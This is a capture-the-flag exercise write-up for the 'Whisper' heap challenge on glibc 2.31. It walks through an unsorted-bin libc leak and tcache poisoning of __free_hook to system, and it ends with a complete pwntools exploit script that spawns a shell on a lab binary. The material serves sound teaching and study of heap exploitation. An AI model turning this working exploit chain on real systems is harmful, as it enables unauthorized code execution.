### Whisper - Unsorted Bin Libc Leak and __free_hook Hijack

> x Exam (59)

The third and final independent exercise chains two distinct techniques into a single end-to-end exploit that produces a shell rather than calling a `win` function. There is no `win` symbol in the binary. The challenge is located in `04_whisper/`, pinned to **glibc 2.31**, and the two-phase attack is: first, leak a runtime libc address by reading the unsorted bin back-pointer through a UAF read primitive; second, use tcache poisoning to overwrite `__free_hook` with the address of `system`, then trigger it by freeing a chunk whose content is the string `/bin/sh`.

**Source Analysis**

The `Note` struct holds a heap pointer `content` and its allocation `size`:

```c
struct Note { char *content; size_t size; };
static struct Note notes[N_NOTES] = {0};
```

Five primitives are exposed. **create** (case 1) reads a size (constrained to `0 < sz ≤ 0x800`), calls `malloc(sz)`, stores both pointer and size, and reads exactly `sz` bytes into the buffer. **delete** (case 2) calls `free(notes[i].content)` without nulling either `content` or `size`, leaving both fields dangling. **edit** (case 3) reads `notes[i].size` bytes into `notes[i].content` through the potentially dangling pointer, forming a **UAF write**. **show** (case 4) calls `write(STDOUT_FILENO, notes[i].content, 0x10)`, printing 16 raw bytes from the content pointer, forming a **UAF read**. The combination of delete-without-null plus show is precisely the unsorted bin leak primitive, and delete-without-null plus edit is the tcache poison primitive.

**Phase 1: Libc Leak via the Unsorted Bin**

A chunk whose size exceeds the tcache ceiling (`chunk_size > 0x410`, i.e., user size `> 0x400`) bypasses the tcache entirely on `free` and is inserted into the unsorted bin. As the first and only entry in an empty unsorted bin, both `fd` and `bk` are written with the address of `main_arena.bins[0]`, a fixed offset from the libc base:

```
main_arena         = &__malloc_hook + 0x10
main_arena.bins[0] = main_arena + 0x60
                   = &__malloc_hook + 0x70
                   = libc_base + libc.sym.__malloc_hook + 0x70
```

A guard chunk allocated between the leak chunk and the top of the heap prevents coalescing with the top, which would absorb the freed chunk and erase the pointers before they can be read.

**Phase 2: tcache Poisoning to `__free_hook`**

With the libc base known, `__free_hook` and `system` addresses are computed directly. Two chunks of identical size are freed to build a tcache list with count two. The UAF write poisons the head's `fd` with `&__free_hook` (a plain unencoded address, since glibc 2.31 has no safe-linking). Two subsequent creates consume the list: the first returns the real chunk (count falls to one), the second returns `&__free_hook` (count falls to zero), and the create handler's `read` call writes `p64(system)` directly into the hook. A final note containing `/bin/sh\x00` is then freed, causing `free` to call `__free_hook(ptr)` = `system("/bin/sh")` before any bin logic executes.

**Heap Timeline**

```
Phase 1:
  create(0, 0x500)    →  chunk L on heap (chunk_size 0x510 > 0x410 → unsorted bin on free)
  create(1, 0x20)     →  guard chunk G  (prevents L from coalescing with top)
  delete(0)           →  L → unsorted bin; L->fd = L->bk = &main_arena.bins[0]
  show(0)             →  UAF read: bytes[0:8] = fd = libc address  ← LEAK

  libc_base = leak - libc.sym.__malloc_hook - 0x70
  FREE_HOOK = libc_base + libc.sym.__free_hook
  SYSTEM    = libc_base + libc.sym.system

Phase 2:
  create(2, 0x60)     →  chunk A
  create(3, 0x60)     →  chunk B

  delete(2)           →  tcache[0x70]: count=1, head=A
  delete(3)           →  tcache[0x70]: count=2, head=B, B->fd=A

  edit(3, ...)        →  UAF write: B->fd = FREE_HOOK  (plain pointer, no safe-linking)
                          tcache[0x70]: count=2, head=B, B->fd=FREE_HOOK

  create(4, 0x60)     →  pops B: count=1, head=FREE_HOOK
  create(5, 0x60,     →  pops FREE_HOOK: writes p64(SYSTEM) into __free_hook
         p64(SYSTEM))

Phase 3:
  create(6, 0x20,     →  note with content = "/bin/sh\x00"
         b'/bin/sh')
  delete(6)           →  free(ptr) → __free_hook(ptr) → system("/bin/sh") → shell
```

**Complete Exploit**

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf  = ELF('./whisper',  checksec=False)
libc             = ELF('./libc.so.6',     checksec=False)

def conn():
    if args.REMOTE:
        return remote('localhost', 1337)
    return process(
        ['./ld-linux-x86-64.so.2', '--library-path', '.', './whisper']
    )

p = conn()

# ------------------------------------------------------------------
# Primitives
# ------------------------------------------------------------------

# case 1: index → size (fgets) → data (read sz bytes)
def create(idx, size, data=b''):
    p.sendlineafter(b'> ',      b'1')
    p.sendlineafter(b'index: ', str(idx).encode())
    p.sendlineafter(b'size: ',  str(size).encode())
    p.sendafter(b'data: ',      data[:size].ljust(size, b'\x00'))

# case 2: free(notes[idx].content) — no null — dangling pointer
def delete(idx):
    p.sendlineafter(b'> ',      b'2')
    p.sendlineafter(b'index: ', str(idx).encode())

# case 3: read(notes[idx].size bytes) into notes[idx].content — UAF write
def edit(idx, data):
    p.sendlineafter(b'> ',      b'3')
    p.sendlineafter(b'index: ', str(idx).encode())
    p.sendafter(b'data: ',      data)

# case 4: write(notes[idx].content, 0x10) — UAF read — returns 16 raw bytes
def show(idx):
    p.sendlineafter(b'> ',      b'4')
    p.sendlineafter(b'index: ', str(idx).encode())
    data = p.recv(0x10)
    p.recvline()                        # consume puts("") newline
    return u64(data[:8])                # fd pointer = libc address

# ------------------------------------------------------------------
# Phase 1 — Libc leak via unsorted bin
# ------------------------------------------------------------------

create(0, 0x500)                        # chunk L: size 0x510 > 0x410 → unsorted bin
create(1, 0x20)                         # guard: prevents L from coalescing with top

delete(0)                               # L → unsorted bin; L->fd = &main_arena.bins[0]

leak = show(0)                          # UAF read: fd = libc runtime address
log.info(f'leak:      {hex(leak)}')

libc.address = leak - libc.sym.__malloc_hook - 0x70
log.info(f'libc base: {hex(libc.address)}')

FREE_HOOK = libc.sym.__free_hook
SYSTEM    = libc.sym.system
log.info(f'free_hook: {hex(FREE_HOOK)}')
log.info(f'system:    {hex(SYSTEM)}')

# ------------------------------------------------------------------
# Phase 2 — Tcache poisoning → __free_hook = system
# ------------------------------------------------------------------

PSIZ = 0x60                             # poison chunk size class

create(2, PSIZ)                         # chunk A
create(3, PSIZ)                         # chunk B (will be HEAD)

delete(2)                               # tcache[0x70]: count=1, head=A
delete(3)                               # tcache[0x70]: count=2, head=B, B->fd=A

# UAF write through dangling notes[3] = B (HEAD): B->fd = &__free_hook
edit(3, p64(FREE_HOOK) + b'\x00' * (PSIZ - 8))

create(4, PSIZ)                         # pops B: count=1, head=FREE_HOOK
create(5, PSIZ, p64(SYSTEM))           # pops FREE_HOOK: __free_hook = system

# ------------------------------------------------------------------
# Phase 3 — Trigger shell
# ------------------------------------------------------------------

create(6, 0x20, b'/bin/sh\x00')        # note whose content is the shell string
delete(6)                               # free(ptr) → system(ptr) → system("/bin/sh")

p.interactive()
```

> **Key takeaway:** The Whisper exploit demonstrates the canonical three-primitive heap chain on glibc 2.31: UAF read from an unsorted bin chunk to recover the libc base, tcache poisoning to redirect `malloc` to `__free_hook`, and a final `free` of a `/bin/sh` pointer to execute a shell. Each phase depends on the previous: without the libc base there is no known address for `__free_hook`, and without `__free_hook` there is no code-execution primitive. The guard chunk is not optional — omitting it causes the leak chunk to coalesce with the top, silently destroying the unsorted bin pointers before they can be read. The pinned libc is equally non-negotiable: the `__free_hook` primitive was removed in glibc 2.34, making this attack impossible on any system libc newer than that version.